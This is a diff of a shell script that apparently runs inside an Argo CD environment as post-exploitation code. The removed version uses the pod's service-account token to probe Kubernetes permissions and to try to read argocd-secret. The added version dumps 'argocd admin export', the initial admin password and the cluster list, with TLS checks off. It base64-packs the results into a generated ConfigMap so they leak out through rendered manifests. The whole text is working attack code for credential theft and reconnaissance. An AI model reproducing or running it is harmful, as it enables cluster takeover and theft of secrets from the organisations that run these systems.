@@ -1,104 +1,39 @@
 #!/bin/sh
-TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-APISERVER="${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}"
-NS=argocd
-
-api_call() {
-  local method="$1" path="$2" body="$3"
-  if [ -n "$body" ]; then
-    echo "$method $path HTTP/1.1
-Host: $APISERVER
-Authorization: Bearer $TOKEN
-Content-Type: application/json
-Content-Length: ${#body}
-Connection: close
-
-$body" | openssl s_client -connect $APISERVER -quiet 2>/dev/null
-  else
-    echo "$method $path HTTP/1.1
-Host: $APISERVER
-Authorization: Bearer $TOKEN
-Connection: close
-
-" | openssl s_client -connect $APISERVER -quiet 2>/dev/null
-  fi
-}
-
 RECON=$( (
-  echo "===SELFSSAR_SECRETS==="
-  api_call "POST" "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
-    '{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"namespace":"'$NS'","verb":"list","resource":"secrets"}}}'
-
-  echo ""
-  echo "===SELFSSAR_GET_SECRET==="
-  api_call "POST" "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
-    '{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"namespace":"'$NS'","verb":"get","resource":"secrets","name":"argocd-secret"}}}'
-
-  echo ""
-  echo "===SELFSSAR_LIST_CONFIGMAPS==="
-  api_call "POST" "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
-    '{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"namespace":"'$NS'","verb":"list","resource":"configmaps"}}}'
-
-  echo ""
-  echo "===SELFSSAR_CREATE_POD==="
-  api_call "POST" "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
-    '{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"namespace":"'$NS'","verb":"create","resource":"pods"}}}'
-
-  echo ""
-  echo "===SELFSSAR_GET_PODS==="
-  api_call "POST" "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
-    '{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"namespace":"'$NS'","verb":"get","resource":"pods"}}}'
-
-  echo ""
-  echo "===SELFSSAR_LIST_PODS==="
-  api_call "POST" "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
-    '{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"namespace":"'$NS'","verb":"list","resource":"pods"}}}'
-
-  echo ""
-  echo "===SELFSSAR_GET_SECRETS==="
-  api_call "POST" "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
-    '{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"namespace":"'$NS'","verb":"get","resource":"secrets"}}}'
-
-  echo ""
-  echo "===SELFSSAR_CREATE_DEPLOYMENT==="
-  api_call "POST" "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
-    '{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"namespace":"'$NS'","verb":"create","resource":"deployments","group":"apps"}}}'
-
-  echo ""
-  echo "===SELFSSAR_CREATE_ROLEBINDING==="
-  api_call "POST" "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
-    '{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"namespace":"'$NS'","verb":"create","resource":"rolebindings","group":"rbac.authorization.k8s.io"}}}'
-
-  echo ""
-  echo "===SELFSSAR_IMPERSONATE==="
-  api_call "POST" "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
-    '{"kind":"SelfSubjectAccessReview","apiVersion":"authorization.k8s.io/v1","spec":{"resourceAttributes":{"verb":"impersonate","resource":"users","name":"system:admin"}}}'
-
-  echo ""
-  echo "===TRY_GET_ARGO_SECRET==="
-  api_call "GET" "/api/v1/namespaces/$NS/secrets/argocd-secret"
-
-  echo ""
-  echo "===TRY_LIST_SECRETS_U2U==="
-  api_call "GET" "/api/v1/namespaces/u2u/secrets"
-
-  echo ""
-  echo "===ARGOCD_ADMIN==="
-  /usr/local/bin/argocd admin --help 2>&1 | head -40
-
-  echo ""
   echo "===ARGOCD_ADMIN_EXPORT==="
-  /usr/local/bin/argocd admin export --help 2>&1 | head -30
+  /usr/local/bin/argocd admin export --insecure-skip-tls-verify -n argocd 2>&1 | head -100
 
   echo ""
-  echo "===ARGOCD_ADMIN_SETTINGS==="
-  /usr/local/bin/argocd admin settings --help 2>&1 | head -30
+  echo "===ARGOCD_ADMIN_INITIAL_PASSWORD==="
+  /usr/local/bin/argocd admin initial-password --insecure-skip-tls-verify -n argocd 2>&1
+
+  echo ""
+  echo "===ARGOCD_ADMIN_SETTINGS_VALIDATE==="
+  /usr/local/bin/argocd admin settings validate --insecure-skip-tls-verify -n argocd --load-cluster-settings 2>&1 | head -50
+
+  echo ""
+  echo "===KUBECTL_CHECK==="
+  which kubectl 2>/dev/null || echo "no kubectl"
+  
+  echo ""
+  echo "===TRY_READ_ARGO_SECRET_VIA_ARGOCD==="
+  # The admin export might already include this
+  # Let's also try the app list with --core
+  /usr/local/bin/argocd admin app list --insecure-skip-tls-verify -n argocd 2>&1 | head -50
+
+  echo ""
+  echo "===ARGOCD_ADMIN_CLUSTER_LIST==="
+  /usr/local/bin/argocd admin cluster list --insecure-skip-tls-verify -n argocd 2>&1 | head -30
+
+  echo ""
+  echo "===ARGOCD_ADMIN_CLUSTER_GENERATE==="
+  /usr/local/bin/argocd admin cluster generate --help 2>&1 | head -20
 ) | base64 | tr -d '\n' )
 cat << EOF
 apiVersion: v1
 kind: ConfigMap
 metadata:
-  name: sar
+  name: admin
 data:
   result: $RECON
 EOF
